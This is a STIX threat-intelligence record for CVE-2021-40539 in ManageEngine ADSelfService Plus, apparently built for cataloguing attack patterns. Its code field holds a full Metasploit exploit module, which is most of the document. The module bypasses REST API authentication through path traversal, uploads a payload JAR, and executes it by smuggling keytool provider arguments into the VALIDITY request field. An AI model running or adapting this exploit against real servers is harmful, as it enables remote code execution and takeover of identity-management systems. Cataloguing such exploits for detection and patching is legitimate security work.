{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--72aa5a7b-0c3e-40fe-b550-a5ec1282aa66",
    "created": "2024-08-14T16:51:49.122157Z",
    "modified": "2024-08-14T16:51:49.122161Z",
    "name": "ManageEngine ADSelfService Plus CVE-2021-40539",
    "description": "No description available.",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/manageengine_adselfservice_plus_cve_2021_40539.rb",
            "external_id": "manageengine_adselfservice_plus_cve_2021_40539.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-40539"
        },
        {
            "source_name": "reference",
            "url": "https://www.manageengine.com/products/self-service-password/kb/how-to-fix-authentication-bypass-vulnerability-in-REST-API.html"
        },
        {
            "source_name": "reference",
            "url": "https://attackerkb.com/topics/DMSNq5zgcW/cve-2021-40539/rapid7-analysis"
        },
        {
            "source_name": "reference",
            "url": "https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/synacktiv/CVE-2021-40539/blob/main/exploit.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::Java::HTTP::ClassLoader # TODO: Refactor this\n  include Msf::Exploit::FileDropper\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'ManageEngine ADSelfService Plus CVE-2021-40539',\n        'Description' => %q{\n          This module exploits CVE-2021-40539, a REST API authentication bypass\n          vulnerability in ManageEngine ADSelfService Plus, to upload a JAR and\n          execute it as the user running ADSelfService Plus - which is SYSTEM if\n          started as a service.\n        },\n        'Author' => [\n          # Discovered by unknown threat actors\n          'Antoine Cervoise', # Independent analysis and RCE\n          'Wilfried B\u00e9card', # Independent analysis and RCE\n          'mr_me', # keytool classloading technique\n          'wvu' # Initial analysis and module\n        ],\n        'References' => [\n          ['CVE', '2021-40539'],\n          ['URL', 'https://www.manageengine.com/products/self-service-password/kb/how-to-fix-authentication-bypass-vulnerability-in-REST-API.html'],\n          ['URL', 'https://attackerkb.com/topics/DMSNq5zgcW/cve-2021-40539/rapid7-analysis'],\n          ['URL', 'https://www.synacktiv.com/en/publications/how-to-exploit-cve-2021-40539-on-manageengine-adselfservice-plus.html'],\n          ['URL', 'https://github.com/synacktiv/CVE-2021-40539/blob/main/exploit.py']\n        ],\n        'DisclosureDate' => '2021-09-07',\n        'License' => MSF_LICENSE,\n        'Platform' => 'java',\n        'Arch' => ARCH_JAVA,\n        'Privileged' => false, # true if ADSelfService Plus is run as a service\n        'Targets' => [\n          ['Java Dropper', {}]\n        ],\n        'DefaultTarget' => 0,\n        'DefaultOptions' => {\n          'RPORT' => 8888\n        },\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'Path traversal for auth bypass', '/./'])\n    ])\n  end\n\n  def check\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/RestAPI/LogonCustomization'),\n      'vars_post' => {\n        'methodToCall' => 'previewMobLogo'\n      }\n    )\n\n    unless res\n      return CheckCode::Unknown('Target failed to respond to check.')\n    end\n\n    unless res.code == 200 && res.body.match?(%r{mobLogo.*/temp/tempMobPreview\\.jpeg})\n      return CheckCode::Safe('Failed to bypass REST API authentication.')\n    end\n\n    CheckCode::Vulnerable('Successfully bypassed REST API authentication.')\n  end\n\n  def exploit\n    upload_payload_jar\n    execute_payload_jar\n  end\n\n  def upload_payload_jar\n    print_status(\"Uploading payload JAR: #{jar_filename}\")\n\n    jar = payload.encoded_jar\n    jar.add_file(\"#{class_name}.class\", constructor_class) # Hack, tbh\n\n    form = Rex::MIME::Message.new\n    form.add_part('unspecified', nil, nil, 'form-data; name=\"methodToCall\"')\n    form.add_part('yas', nil, nil, 'form-data; name=\"Save\"')\n    form.add_part('smartcard', nil, nil, 'form-data; name=\"form\"')\n    form.add_part('Add', nil, nil, 'form-data; name=\"operation\"')\n    form.add_part(jar.pack, 'application/java-archive', 'binary',\n                  %(form-data; name=\"CERTIFICATE_PATH\"; filename=\"#{jar_filename}\"))\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/RestAPI/LogonCustomization'),\n      'ctype' => \"multipart/form-data; boundary=#{form.bound}\",\n      'data' => form.to_s\n    )\n\n    unless res&.code == 404\n      fail_with(Failure::NotVulnerable, 'Failed to upload payload JAR')\n    end\n\n    # C:\\ManageEngine\\ADSelfService Plus\\bin (working directory)\n    register_file_for_cleanup(jar_filename)\n\n    print_good('Successfully uploaded payload JAR')\n  end\n\n  def execute_payload_jar\n    print_status('Executing payload JAR')\n\n    res = send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/RestAPI/Connection'),\n      'vars_post' => {\n        'methodToCall' => 'openSSLTool',\n        'action' => 'generateCSR',\n        # https://docs.oracle.com/javase/8/docs/technotes/tools/unix/keytool.html\n        'VALIDITY' => \"#{rand(1..365)} -providerclass #{class_name} -providerpath #{jar_filename}\"\n      }\n    )\n\n    unless res&.code == 404\n      fail_with(Failure::PayloadFailed, 'Failed to execute payload JAR')\n    end\n\n    print_good('Successfully executed payload JAR')\n  end\n\n  def jar_filename\n    @jar_filename ||= \"#{rand_text_alphanumeric(8..16)}.jar\"\n  end\n\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2021-09-07",
    "x_mitre_platforms": [
        "java'"
    ]
}